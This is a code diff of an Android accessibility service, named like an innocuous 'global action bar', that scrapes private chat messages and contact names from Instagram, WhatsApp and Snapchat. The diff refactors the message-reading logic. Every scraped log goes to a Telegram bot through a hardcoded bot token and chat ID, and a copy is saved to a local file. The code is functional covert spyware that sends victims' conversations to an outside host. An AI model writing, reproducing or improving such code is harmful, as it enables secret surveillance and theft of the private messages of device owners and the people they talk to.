@@ -22,28 +22,25 @@ public class GlobalActionBarService extends AccessibilityService {
 
     private SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
 
-    // 🔥 REPLACE WITH YOUR REAL TOKEN AND CHAT ID
+    // 🔥 YOUR TELEGRAM CREDENTIALS
     private static final String BOT_TOKEN = "8745417407:AAHpcDSAa4yeLeJRjI_8ut8BrjOShffi7bs";
     private static final String CHAT_ID = "5465116744";
 
-    // Cooldown: only send once every 5 seconds
+    // Cooldown & deduplication
     private long lastSendTime = 0;
     private String lastSentHash = "";
 
-    // Message view IDs (Instagram, WhatsApp, Snapchat)
+    // Known view IDs for messages (Instagram, WhatsApp, Snapchat)
     private Set<String> messageViewIds = new HashSet<String>() {{
-        // Instagram
         add("com.instagram.android:id/row_message_text");
         add("com.instagram.android:id/comment_text");
         add("com.instagram.android:id/direct_message_text");
         add("com.instagram.android:id/message_text");
-        // WhatsApp
         add("com.whatsapp:id/message_text");
-        // Snapchat
         add("com.snapchat.android:id/chat_message_text");
     }};
 
-    // Sender name view IDs
+    // Known view IDs for sender names
     private Set<String> senderViewIds = new HashSet<String>() {{
         add("com.instagram.android:id/row_user_name");
         add("com.instagram.android:id/comment_user_name");
@@ -53,7 +50,7 @@ public class GlobalActionBarService extends AccessibilityService {
         add("com.snapchat.android:id/chat_name");
     }};
 
-    // Blacklist of strings to ignore completely
+    // Blacklist – add any junk you see to this set
     private Set<String> uiJunk = new HashSet<String>() {{
         add("Send"); add("Message"); add("Back"); add("More"); add("Profile");
         add("Delete"); add("Copy"); add("Reply"); add("Forward"); add("Settings");
@@ -92,81 +89,79 @@ public class GlobalActionBarService extends AccessibilityService {
         if (event.getPackageName() == null) return;
         String pkg = event.getPackageName().toString();
 
-        // Target only Instagram, Snapchat, WhatsApp
+        // Only process events from target apps
         if (!pkg.equals("com.instagram.android") &&
             !pkg.equals("com.snapchat.android") &&
             !pkg.equals("com.whatsapp")) {
             return;
         }
 
-        // Only on window state change (new chat opened) or content change (new message)
-        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
-            event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
-
-            AccessibilityNodeInfo root = getRootInActiveWindow();
-            if (root == null) return;
-
-            // 1. Get contact name (only from sender view IDs)
-            String contactName = findContactName(root);
-
-            // 2. Get all message texts from known message view IDs
-            List<String> messageTexts = extractMessageTexts(root);
-
-            // 3. Clean and deduplicate
-            Set<String> uniqueMessages = new HashSet<>();
-            for (String msg : messageTexts) {
-                String cleaned = cleanMessage(msg);
-                if (!cleaned.isEmpty()) {
-                    uniqueMessages.add(cleaned);
-                }
-            }
-
-            // 4. Build output
-            if (uniqueMessages.isEmpty()) return; // no real messages
-
-            StringBuilder logBuilder = new StringBuilder();
-            logBuilder.append(String.format("[%s] APP: %s\n", dateFormat.format(new Date()), getAppName(pkg)));
-            if (contactName != null && !contactName.isEmpty()) {
-                logBuilder.append("👤 Chat with: ").append(contactName).append("\n");
-            }
-            logBuilder.append("─────────────────────\n");
-            for (String msg : uniqueMessages) {
-                // Try to split sender:message if ":" exists
-                if (msg.contains(":")) {
-                    String[] parts = msg.split(":", 2);
-                    if (parts.length == 2 && parts[0].trim().length() < 30) {
-                        logBuilder.append("  ").append(parts[0].trim()).append(": ").append(parts[1].trim()).append("\n");
-                        continue;
-                    }
-                }
-                logBuilder.append("  Message: ").append(msg).append("\n");
-            }
-
-            String fullLog = logBuilder.toString().trim();
-            if (fullLog.length() < 30) return; // too short, likely no meaningful content
-
-            // Cooldown + hash check
-            String hash = Integer.toHexString(fullLog.hashCode());
-            long now = System.currentTimeMillis();
-            if (hash.equals(lastSentHash) || (now - lastSendTime) < 5000) {
-                // Same content or too soon – skip
-                return;
-            }
-
-            // Update state and send
-            lastSentHash = hash;
-            lastSendTime = now;
-            sendToTelegram(fullLog);
-            writeToFile(fullLog);
+        // Only on window or content change (new message or scroll)
+        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
+            event.getEventType() != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+            return;
         }
+
+        AccessibilityNodeInfo root = getRootInActiveWindow();
+        if (root == null) return;
+
+        // 1. Get contact name
+        String contactName = findContactName(root);
+
+        // 2. Extract message texts from known view IDs
+        List<String> rawMessages = extractMessageTexts(root);
+
+        // 3. Clean and deduplicate
+        Set<String> uniqueMessages = new HashSet<>();
+        for (String msg : rawMessages) {
+            String cleaned = cleanMessage(msg);
+            if (!cleaned.isEmpty()) uniqueMessages.add(cleaned);
+        }
+
+        if (uniqueMessages.isEmpty()) return;
+
+        // 4. Build structured output
+        StringBuilder logBuilder = new StringBuilder();
+        logBuilder.append(String.format("[%s] APP: %s\n", dateFormat.format(new Date()), getAppName(pkg)));
+        if (contactName != null && !contactName.isEmpty()) {
+            logBuilder.append("👤 Chat with: ").append(contactName).append("\n");
+        }
+        logBuilder.append("─────────────────────\n");
+        for (String msg : uniqueMessages) {
+            // If message contains ":", try to split sender:message
+            if (msg.contains(":")) {
+                String[] parts = msg.split(":", 2);
+                if (parts.length == 2 && parts[0].trim().length() < 30) {
+                    logBuilder.append("  ").append(parts[0].trim()).append(": ").append(parts[1].trim()).append("\n");
+                    continue;
+                }
+            }
+            logBuilder.append("  Message: ").append(msg).append("\n");
+        }
+
+        String fullLog = logBuilder.toString().trim();
+        if (fullLog.length() < 30) return; // ignore if not enough content
+
+        // 5. Deduplication & cooldown
+        String hash = Integer.toHexString(fullLog.hashCode());
+        long now = System.currentTimeMillis();
+        if (hash.equals(lastSentHash) || (now - lastSendTime) < 5000) {
+            return;
+        }
+        lastSentHash = hash;
+        lastSendTime = now;
+
+        // 6. Send to Telegram
+        sendToTelegram(fullLog);
+        writeToFile(fullLog);
     }
+
+    // ---- Helper methods ----
 
     private String findContactName(AccessibilityNodeInfo root) {
         for (String id : senderViewIds) {
             String name = findTextByViewId(root, id);
-            if (name != null && !name.isEmpty()) {
-                return name;
-            }
+            if (name != null && !name.isEmpty()) return name;
         }
         return null;
     }
@@ -218,21 +213,19 @@ public class GlobalActionBarService extends AccessibilityService {
 
     private String cleanMessage(String msg) {
         msg = msg.trim();
-        // Reject if contains any junk substring (case-insensitive)
+        // Remove if contains junk
         for (String junk : uiJunk) {
-            if (msg.toLowerCase().contains(junk.toLowerCase())) {
-                return "";
-            }
+            if (msg.toLowerCase().contains(junk.toLowerCase())) return "";
         }
-        // Remove timestamps like "12:30", "12:30 PM", "2m", "1h"
+        // Remove timestamps
         if (msg.matches(".*\\d{1,2}:\\d{2}.*")) return "";
         if (msg.matches(".*(AM|PM).*")) return "";
         if (msg.matches(".*\\d+[mh] .*")) return "";
         // Must contain at least one alphabetic character
         if (!msg.matches(".*[a-zA-Z].*")) return "";
-        // Too short (likely UI label)
+        // Too short
         if (msg.length() < 3) return "";
-        // If all uppercase and short, likely UI
+        // All caps and short
         if (msg.equals(msg.toUpperCase()) && msg.length() < 8) return "";
         return msg;
     }
@@ -244,7 +237,8 @@ public class GlobalActionBarService extends AccessibilityService {
         return pkg;
     }
 
-    // ---------- Telegram Sender ----------
+    // ---- Telegram & File logging ----
+
     private void sendToTelegram(final String message) {
         new Thread(() -> {
             try {
@@ -256,7 +250,7 @@ public class GlobalActionBarService extends AccessibilityService {
                 conn.setRequestMethod("GET");
                 conn.setConnectTimeout(5000);
                 conn.setReadTimeout(5000);
-                int responseCode = conn.getResponseCode();
+                conn.getResponseCode();
                 conn.disconnect();
             } catch (Exception e) {
                 writeToFile("Telegram error: " + e.toString());
@@ -272,9 +266,7 @@ public class GlobalActionBarService extends AccessibilityService {
             writer.write(text + "\n");
             writer.flush();
             writer.close();
-        } catch (Exception e) {
-            // ignore
-        }
+        } catch (Exception e) { /* ignore */ }
     }
 
     @Override
